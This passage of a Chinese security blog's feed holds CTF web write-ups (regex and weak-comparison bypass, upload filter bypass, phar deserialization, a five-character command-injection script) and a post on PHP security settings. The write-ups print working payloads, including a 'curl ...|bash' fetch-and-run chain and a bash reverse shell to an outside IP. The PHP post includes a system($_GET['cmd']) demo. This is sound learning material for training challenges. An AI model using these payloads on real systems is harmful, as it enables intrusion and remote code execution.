class="line">include &apos;f1agi3hEre.php&apos;;</span><br><span class="line">if  (&quot;POST&quot; == $_SERVER[&apos;REQUEST_METHOD&apos;])</span><br><span class="line">&#123;</span><br><span class="line">    $password = $_POST[&apos;password&apos;];</span><br><span class="line">    if (0 &gt;= preg_match(&apos;/^[[:graph:]]&#123;12,&#125;$/&apos;, $password))</span><br><span class="line">    &#123;</span><br><span class="line">        echo &apos;Wrong Format&apos;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">    while (TRUE)</span><br><span class="line">    &#123;</span><br><span class="line">        $reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;;</span><br><span class="line">        if (6 &gt; preg_match_all($reg, $password, $arr))</span><br><span class="line">            break;</span><br><span class="line">        $c = 0;</span><br><span class="line">        $ps = array(&apos;punct&apos;, &apos;digit&apos;, &apos;upper&apos;, &apos;lower&apos;);</span><br><span class="line">        foreach ($ps as $pt)</span><br><span class="line">        &#123;</span><br><span class="line">            if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password))</span><br><span class="line">            $c += 1;</span><br><span class="line">        &#125;</span><br><span class="line">        if ($c &lt; 3) break;</span><br><span class="line">        if (&quot;42&quot; == $password) echo $flag;</span><br><span class="line">        else echo &apos;Wrong password&apos;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>审一下源码，主要是三层正则匹配的绕过。</p><p>第一层<code>if (0 &gt;= preg_match(&#39;/^[[:graph:]]{12,}$/&#39;, $password))</code>意思是至少要输入12个字符。<br>第二层<code>$reg = &#39;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#39;;</code>意思是在标点、数字、小写和大写不同类的字符，都要切换组合至少6次，如：数字+标点+数字+字母+数字+字母。<br>第三层<code>if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password))</code>是循环的正则匹配，意思是至少要出现三个种类的字符。</p><p>最后是字符串的弱类型比较，这样分析完，就能够构造payload。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=42.0e+000000000</span><br></pre></td></tr></table></figure><h2 id="wafupload"><a href="#wafupload" class="headerlink" title="wafupload"></a>wafupload</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$sandbox = &apos;/var/www/html/upload/&apos; . md5(&quot;phpIsBest&quot; . $_SERVER[&apos;REMOTE_ADDR&apos;]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line"></span><br><span class="line">if (!empty($_FILES[&apos;file&apos;])) &#123;</span><br><span class="line">    #mime check</span><br><span class="line">    if (!in_array($_FILES[&apos;file&apos;][&apos;type&apos;], [&apos;image/jpeg&apos;, &apos;image/png&apos;, &apos;image/gif&apos;])) &#123;</span><br><span class="line">        die(&apos;This type is not allowed!&apos;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    #check filename</span><br><span class="line">    $file = empty($_POST[&apos;filename&apos;]) ? $_FILES[&apos;file&apos;][&apos;name&apos;] : $_POST[&apos;filename&apos;];</span><br><span class="line">    if (!is_array($file)) &#123;</span><br><span class="line">        $file = explode(&apos;.&apos;, strtolower($file));</span><br><span class="line">    &#125;</span><br><span class="line">    $ext = end($file);</span><br><span class="line">    if (!in_array($ext, [&apos;jpg&apos;, &apos;png&apos;, &apos;gif&apos;])) &#123;</span><br><span class="line">        die(&apos;This file is not allowed!&apos;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filename = reset($file) . &apos;.&apos; . $file[count($file) - 1];</span><br><span class="line">    if (move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;], $sandbox . &apos;/&apos; . $filename)) &#123;</span><br><span class="line">        echo &apos;Success!&apos;;</span><br><span class="line">        echo &apos;filepath:&apos; . $sandbox . &apos;/&apos; . $filename;</span><br><span class="line">    &#125; else        echo &apos;Failed!&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(__file__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>第一层，对$_FILES全局变量的mime进行检测。</p><p>第二层，判断条件里的<code>!is_array($file)</code>很明显的提示我们，$file传入一个数组不就绕过字符串的切割了么，那就能够随意构造了。</p><p>第三层后缀名过滤和文件名拼接有两个地方的不一致导致漏洞。<code>end($file)</code>和<code>$file[count($file) - 1]</code>都想指后缀名。</p><p>end()：将数组的内部指针指向最后一个单元，通俗讲就是谁后传指向谁。</p><p>那么我们可以把下标小的后传就能造成两个函数指向的不一致。<br><img src="/img/10510.jpg" alt=""></p><p>连上蚁剑拿到flag<br><img src="/img/10511.jpg" alt=""></p><h2 id="不认真的upload"><a href="#不认真的upload" class="headerlink" title="不认真的upload"></a>不认真的upload</h2><p>这题老哥参考链接讲的很棒啦，我也是现学现卖的。<a href="http://note.youdao.com/" target="_blank" rel="noopener">四个实例递进php反序列化漏洞理解</a></p><p>随便上传一个gif文件，根据提示访问flag.php，查看源码，得到php代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$recieve = $_GET[&apos;filename&apos;];</span><br><span class="line"></span><br><span class="line">class flag&#123;</span><br><span class="line">var $file;</span><br><span class="line">private $flag = &apos;****&apos;;</span><br><span class="line"></span><br><span class="line">function __destruct()&#123;</span><br><span class="line">if ($this-&gt;file == &apos;phar&apos;)&#123;</span><br><span class="line">echo $this-&gt;flag;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">file_get_contents($recieve);</span><br></pre></td></tr></table></figure><p>根据代码，要构造一个flag对象，并且对象的file属性要等于phar才能得到flag，那么构造我们的phar文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class flag&#123;</span><br><span class="line">    var $file = &quot;phar&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(&quot;kage.phar&quot;);</span><br><span class="line">$test = new flag();</span><br><span class="line">$phar = new Phar(&quot;kage.phar&quot;);</span><br><span class="line"></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); // 增加gif文件头</span><br><span class="line">$phar-&gt;setMetadata($test);</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);</span><br><span class="line"></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>生成gif上传成功，到flag.php，引用文件就行了</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://206.189.214.99:2080/flag.php?filename=phar://upload_file/kage.gif/test.txt</span><br></pre></td></tr></table></figure><h2 id="BabyFirstRevenge"><a href="#BabyFirstRevenge" class="headerlink" title="BabyFirstRevenge"></a>BabyFirstRevenge</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(E_ALL);</span><br><span class="line">    $sandbox = &apos;/var/www/html/sandbox/&apos;.md5(&quot;orange&quot;.$_SERVER[&apos;REMOTE_ADDR&apos;]);</span><br><span class="line">    mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    if (isset($_GET[&apos;cmd&apos;]) &amp;&amp; strlen($_GET[&apos;cmd&apos;]) &lt;= 5) &#123;</span><br><span class="line">        exec($_GET[&apos;cmd&apos;]);</span><br><span class="line">    &#125; else if (isset($_GET[&apos;reset&apos;])) &#123;</span><br><span class="line">        exec(&apos;/bin/rm -rf &apos; . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure><p>可以看到，本题允许我们执行任意代码，但是长度限制在5个以内。<br>这题网上一些wp总结的很详细了。<br><a href="https://www.jianshu.com/p/a77e956d9941" target="_blank" rel="noopener">BabyFirst Revenge复现</a>。</p><p>第一步就是通过<code>&gt;</code>管道符以一定顺序创建文件，每个文件后面带有<code>\</code>代表一个payload语句块，然后通过<code>ls -t&gt;a</code>将文件名按时间排序输出到a文件，组成我们的paylaod语句，最后sh执行a文件达到命令执行。<br>命令如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl www.silky.fun|bash</span><br></pre></td></tr></table></figure></p><p>第二步就是反弹shell，我是通过bash进行反弹。具体实现，就是将我们的反弹脚本放在自己的vps上，然后利用命令执行漏洞让目标机器执行我们的反弹脚本，连向我们的vps，最后拿到shell。<br>反弹shell如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/45.76.195.120/12345 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p><p>原理并不难，但是按老哥文章复现真的是坑挺多的。</p><p>首先我们vps的ip每个点前数字不能是一样，因为会生成同样的文件名导致ip的不完整，不幸的是我的vps就是这样的，一度卡壳，最后通过注册域名解决。</p><p>第二按网上的脚本，形成的payload后面会有没用的代码来中断shell的连接，最后我在payload添加&amp;sleep来阻断后面代码执行，成功实现复现。</p><p>最后分享一下脚本吧。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from time import sleep</span><br><span class="line">from urllib import quote</span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line">    # generate `ls -t&gt;g` file</span><br><span class="line">    &apos;&gt;ls\\&apos;, </span><br><span class="line">    &apos;ls&gt;_&apos;, </span><br><span class="line">    &apos;&gt;\ \\&apos;, </span><br><span class="line">    &apos;&gt;-t\\&apos;, </span><br><span class="line">    &apos;&gt;\&gt;g&apos;, </span><br><span class="line">    &apos;ls&gt;&gt;_&apos;, </span><br><span class="line"></span><br><span class="line">    # generate `curl 45.76.195.120|bash`</span><br><span class="line">    # generate `curl www.silky.fun|bash`</span><br><span class="line">    &apos;&gt;\ \\&apos;,</span><br><span class="line">    &apos;&gt;p\\&apos;,</span><br><span class="line">    &apos;&gt;ee\\&apos;,</span><br><span class="line">    &apos;&gt;sl\\&apos;,</span><br><span class="line">    &apos;&gt;\&amp;\\&apos;,</span><br><span class="line">    &apos;&gt;sh\\&apos;, </span><br><span class="line">    &apos;&gt;ba\\&apos;, </span><br><span class="line">    &apos;&gt;\|\\&apos;,</span><br><span class="line">    &apos;&gt;n\\&apos;,</span><br><span class="line">    &apos;&gt;fu\\&apos;, </span><br><span class="line">    &apos;&gt;y.\\&apos;,</span><br><span class="line">    &apos;&gt;lk\\&apos;, </span><br><span class="line">    &apos;&gt;si\\&apos;, </span><br><span class="line">    &apos;&gt;w.\\&apos;, </span><br><span class="line">    &apos;&gt;ww\\&apos;,</span><br><span class="line">    &apos;&gt;\ \\&apos;, </span><br><span class="line">    &apos;&gt;rl\\&apos;, </span><br><span class="line">    &apos;&gt;cu\\&apos;, </span><br><span class="line"></span><br><span class="line">    # exec</span><br><span class="line">    &apos;sh _&apos;, </span><br><span class="line">    &apos;sh g&apos;, </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = requests.get(&apos;http://120.79.33.253:9003/?reset=1&apos;)</span><br><span class="line">for i in payload:</span><br><span class="line">    assert len(i) &lt;= 5 </span><br><span class="line">    r = requests.get(&apos;http://120.79.33.253:9003/?cmd=&apos; + quote(i) )</span><br><span class="line">    print i</span><br><span class="line">    sleep(0.2)</span><br></pre></td></tr></table></figure><h2 id="WEB-Linux"><a href="#WEB-Linux" class="headerlink" title="WEB||Linux"></a>WEB||Linux</h2><p>这题和最后一题Babyfirst是同一题的，只是限制条件放宽了。我是先做的最后一题，来做这题就很轻松了。</p><p>题目说不用getshell就能做，那多没意思，渗透最刺激的就是getshell啦。</p><p>还是按上题思路，但是这次就没必要写脚本了。<br>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://206.189.214.99:4080?dog3=&gt;fun\|bash</span><br><span class="line">http://206.189.214.99:4080?dog3=&gt;curl\ www.silky.\\</span><br><span class="line">http://206.189.214.99:4080?dog3=&gt;ls -t&gt;a</span><br><span class="line">http://206.189.214.99:4080?dog3=&gt;sh a</span><br></pre></td></tr></table></figure><p>后台打开nc等着shell，拿到shell搜寻一番，尽然看到xss的源码，顺便也把xss也秒了。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>最近有几个萌新问我安全怎么入门，包括我的一个高中好朋友，哈哈，越来越多小伙伴一起学习还是很开心的(～￣▽￣)～。。其实入门的东西，，道格平台和三叶草wiki已经写的很详细了，大家跟着上面学问题就不大啦，不过我还是要加一点补充，就是对于像ctf、漏洞之类的学习，不要以为看懂教程就会了，一定要自己动手复现一遍才算学到真本事。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;说好的要好好写博客呢，怎么这么久还没发布新文章。别急啦，文章并不是主要的，关键在于有没有在搞技术啦。最近国庆没什么事干，就到各个平台刷一下CTF，这里就总结一下道格平台web的wp。&lt;/p&gt;
&lt;h2 id=&quot;GET&quot;&gt;&lt;a href=&quot;#GET&quot; class=&quot;headerlink&quot; title=&quot;$_GET&quot;&gt;&lt;/a&gt;$_GET&lt;/h2&gt;&lt;p&gt;前两题主要学习HTTP的两种传参方式，GET传参和POST传参，这也是web安全漏洞产生的两个主要入口。&lt;br&gt;如何GET传参呢？在网页的网址就是url末尾加上？然后以键值对形式表示，多个值要用&amp;amp;分隔。&lt;br&gt;Payload：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;http://106.12.21.77:8080/get/get.php?what=flag&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>PHP核心配置</title>
    <link href="http://yoursite.com/2018/04/07/PHP%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/"/>
    <id>http://yoursite.com/2018/04/07/PHP核心配置/</id>
    <published>2018-04-07T13:55:56.705Z</published>
    <updated>2018-04-30T07:07:45.864Z</updated>
    
    <content type="html"><![CDATA[<p>了解php的配置对web渗透还是很重要的~</p><h3 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h3><ol><li>大小写敏感<br> directive = value (指令=值)<br> foo=bar ≠ FOO=bar</li><li>运算符<br>|、&amp;、~、! </li><li>空值的表达式<br> foo = ;<br> foo = none ;<br> foo = “none” 是空的字符串</li></ol><h3 id="安全模式"><a href="#安全模式" class="headerlink" title="安全模式"></a>安全模式<br></h3><p>safe_mode = off<br>安全模式，用来限制文档的存取<br>与命令执行漏洞有关<br><a id="more"></a><br><em>本特性已在PHP5.4.0被移除</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cmd = $_GET[&apos;cmd&apos;];</span><br><span class="line">system($cmd);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>关闭safe_mode，可以进行命令执行<br><img src="/img/40501.png" alt=""><br>开启safe_mode，显示为空白<br>    <img src="/img/40502.png" alt=""></p><h3 id="限制环境变量存取"><a href="#限制环境变量存取" class="headerlink" title="限制环境变量存取"></a>限制环境变量存取<br></h3><p>safe_mode_allowed_env_vars = string<br><br>制定PHP程序可以改变的环境变量的前缀，当这个选项的值为空时，那么PHP可以改变任何环境变量</p><h3 id="外部程序执行目录"><a href="#外部程序执行目录" class="headerlink" title="外部程序执行目录"></a>外部程序执行目录<br></h3><p>指定网站的主目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">safe_mode_exec_dir = &quot;E:\Local Test\WWW&quot;</span><br></pre></td></tr></table></figure><h3 id="禁用函数"><a href="#禁用函数" class="headerlink" title="禁用函数"></a>禁用函数<br></h3><p>disable_functions<br><br>为了更安全的运行PHP，可以用此指令来禁止一些敏感函数的使用，当你想用本指令禁止一些函数时，切忌把dl()函数也加到禁止列表，攻击者可以利用dl()函数加载自定义的php扩展来突破disalbe_function。配置禁用函数时可以使用逗号分隔函数名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disable_functions = system</span><br></pre></td></tr></table></figure><p><img src="/img/40503.png" alt=""></p><h3 id="com组件"><a href="#com组件" class="headerlink" title="com组件"></a>com组件<br></h3><p>默认为true<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.allow_dcom = false</span><br></pre></td></tr></table></figure></p><p>PHP设置在安全模式下(safe_mode)，仍旧允许攻击者使用COM()函数来创建系统组件来执行任意命令，推荐关闭这个函数来防止出现此漏洞</p><p>使用COM()函数需要在PHP.ini中配置extension=php_com_dotnet.dll，如果PHP&lt;5.4.5 则不需要</p><h3 id="全局变量注册开关"><a href="#全局变量注册开关" class="headerlink" title="全局变量注册开关"></a>全局变量注册开关</h3><p><br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">register_globals = off</span><br></pre></td></tr></table></figure></p><p>php.ini的register_globals选项的默认值预设为off，在4.2版本之前是默认开启的，当register_globals的设定为On时，程序可以接受来自服务器的各种环境变量，包括表单提交的变量，这是对服务器来讲是非常不安全的，所以我们不能让它注册为全局变量。</p><ul><li>register_globals=Off时，服务器端获取数据的时候用$_GET[‘name’]来获取数据</li><li>register_globals=On时，服务器端使用POST或者GET提交的变量，都将自动使用全局变量的值来接受值</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&apos;&apos; method=&apos;get&apos;&gt;</span><br><span class="line">&lt;input type=&apos;text&apos; name=&apos;username&apos; value=&apos;alex&apos; &gt;</span><br><span class="line">&lt;input type=&apos;submit&apos; name=&apos;sub&apos; value=&apos;sub&apos;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">echo &apos;username::&apos;,$username;</span><br><span class="line">echo &apos;&lt;br&gt;sub::&apos;,$sub;</span><br><span class="line">echo &apos;&lt;br&gt;GET::&apos;;</span><br><span class="line">print_r($_GET);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>当设置为off时<br><img src="/img/40505.png" alt=""><br>设置为On时<br><img src="/img/40506.png" alt=""></p><h3 id="魔术引号自动过滤"><a href="#魔术引号自动过滤" class="headerlink" title="魔术引号自动过滤"></a>魔术引号自动过滤<br></h3><p>magic_quotes_gpc= on<br>magic_quotes_gpc = Off 在php.ini里是默认关闭的，如果它打开后将自动把用户提交对sql的查询语句进行转换，如果设置成ON的话，PHP会把所有的单引号、双引号、反斜杠和空字符加上反斜杠进行转义，它会影响HTTP请求的数据有（GET、POST、Cookies），开启它会提高网站的安全性，当然，也可以使用addslashes来转义提交的HTTP请求数据，或者用stripslashes来删除转义</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = $_GET[&apos;a&apos;];</span><br><span class="line">echo $a;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>当关闭魔术过滤，可以看到原样输出</p><p><img src="/img/40507.png" alt=""><br>当开启魔术过滤，就被转义了<br><img src="/img/40508.png" alt=""></p><h3 id="是否允许包含远程文件"><a href="#是否允许包含远程文件" class="headerlink" title="是否允许包含远程文件"></a>是否允许包含远程文件</h3><p><br>allow_url_include = off<br>该配置为on的情况下，可以直接包含远程文件，若包含的变量为可控的情况下，可以直接控制变量来执行PHP代码</p><h3 id="HTTP头版本信息"><a href="#HTTP头版本信息" class="headerlink" title="HTTP头版本信息"></a>HTTP头版本信息</h3><p><br> expose_php = off<br><br> 防止了通过http头部泄露的php版本信息</p><h3 id="文件上传临时目录"><a href="#文件上传临时目录" class="headerlink" title="文件上传临时目录"></a>文件上传临时目录</h3><p><br> upload_tmp_dir =<br><br>上传文件临时保存的目录，如果不设置的话，则采用系统的临时目录</p><h3 id="用户可访问目录"><a href="#用户可访问目录" class="headerlink" title="用户可访问目录"></a>用户可访问目录<br></h3><pre><code>open_basedir = E:\Local Test\WWW&lt;br&gt;&lt;br&gt;</code></pre><p>能够控制PHP脚本只能访问指定的目录，这样能够避免PHP脚本访问，不应该访问的文件，一定程度上限制了phpshell的危害</p><p>查看目录文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(scandir(dirname(__FILE__)));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>并限制可访问目录为当前目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open_basedir =C:\www\zaxiang</span><br></pre></td></tr></table></figure><p>查看目录<br><img src="/img/40509.png" alt=""><br>查看其他目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(scandir(dirname(__FILE__.&quot;./../&quot;)));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/img/40510.png" alt=""><br>访问被拒绝</p><h3 id="内部错误选项"><a href="#内部错误选项" class="headerlink" title="内部错误选项"></a>内部错误选项</h3><p>display_errors = on<br>表明显示PHP脚本的内部错误，网站发布后建议关闭PHP的错误回显，在调试的时候通常把PHP错误显示打开</p><h3 id="错误报告级别"><a href="#错误报告级别" class="headerlink" title="错误报告级别"></a>错误报告级别<br></h3><p>error_reportting = E_ALL &amp; ~E_NOTICE<br>这个设置的作用是将错误级别调到最高，显示所有问题，方便排错</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;了解php的配置对web渗透还是很重要的~&lt;/p&gt;
&lt;h3 id=&quot;基础语法&quot;&gt;&lt;a href=&quot;#基础语法&quot; class=&quot;headerlink&quot; title=&quot;基础语法&quot;&gt;&lt;/a&gt;基础语法&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;大小写敏感&lt;br&gt; directive = value (指令=值)&lt;br&gt; foo=bar ≠ FOO=bar&lt;/li&gt;
&lt;li&gt;运算符&lt;br&gt;|、&amp;amp;、~、! &lt;/li&gt;
&lt;li&gt;空值的表达式&lt;br&gt; foo = ;&lt;br&gt; foo = none ;&lt;br&gt; foo = “none” 是空的字符串&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&quot;安全模式&quot;&gt;&lt;a href=&quot;#安全模式&quot; class=&quot;headerlink&quot; title=&quot;安全模式&quot;&gt;&lt;/a&gt;安全模式&lt;br&gt;&lt;/h3&gt;&lt;p&gt;safe_mode = off&lt;br&gt;安全模式，用来限制文档的存取&lt;br&gt;与命令执行漏洞有关&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
